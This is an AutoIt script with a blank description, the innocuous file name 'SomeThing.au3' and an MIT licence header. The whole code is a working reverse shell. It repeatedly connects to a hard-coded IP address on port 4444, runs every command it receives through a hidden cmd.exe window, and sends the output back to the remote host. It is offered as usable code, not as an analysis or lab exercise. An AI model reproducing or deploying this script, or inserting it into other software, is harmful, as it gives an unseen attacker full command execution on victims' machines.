;~ /*
;~ /* File: SomeThing.au3
;~ /* Author: TiDz
;~ /* Contact: nguyentinvs123@gmail.com
;~  * Created on Thu Apr 03 2025
;~  *
;~  * Description: 
;~  *
;~  * The MIT License (MIT)
;~  * Copyright (c) 2025 TiDz
;~  *
;~  * Permission is hereby granted, free of charge, to any person obtaining a copy of this software
;~  * and associated documentation files (the "Software"), to deal in the Software without restriction,
;~  * including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense,
;~  * and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so,
;~  * subject to the following conditions: unconditional.
;~  *
;~  * Useage: 
;~  */
#include <AutoItConstants.au3>
#include <GUIConstantsEx.au3>
#include <MsgBoxConstants.au3>

Global $host = "103.97.127.14"
Global $port = 4444

Global $currentDir = @WorkingDir

While 1
    If Ping($host, 250) Then 
        TCPStartup()
        $socket = TCPConnect($host, $port)
        If $socket <> -1 Then 
            ExitLoop 
        EndIf
        TCPCloseSocket($socket)
        TCPShutdown()
    EndIf
    Sleep(1000) 
WEnd

TCPSend($socket, $currentDir & "> ")
While 1
    If @error Then ExitLoop
    $recv = TCPRecv($socket, 1024)
    If $recv <> "" Then
        If StringLeft($recv, 3) = "cd " Then 
            $dirToChange = StringTrimLeft($recv, 3)
            $dirToChange = StringStripWS($dirToChange, 3) 
            If FileChangeDir($dirToChange) Then
                $currentDir = @WorkingDir
                TCPSend($socket, $currentDir & "> ")
            Else
                TCPSend($socket, "[!] Failed to change directory" & @CRLF)
                TCPSend($socket, $currentDir & "> ")
            EndIf
        Else
            $cmd = Run(@ComSpec & " /c " & $recv, "", @SW_HIDE, 2)
            $stdout = ""
            While @ComSpec & " /c " & $recv <> ""
                $line = StdoutRead($cmd)
                If @error Then ExitLoop
                $stdout &= $line
            WEnd
            $ret = TCPSend($socket, $stdout)
            TCPSend($socket, $currentDir & "> ")
            Sleep(500)
        EndIf
    EndIf
WEnd

TCPCloseSocket($socket)
TCPShutdown()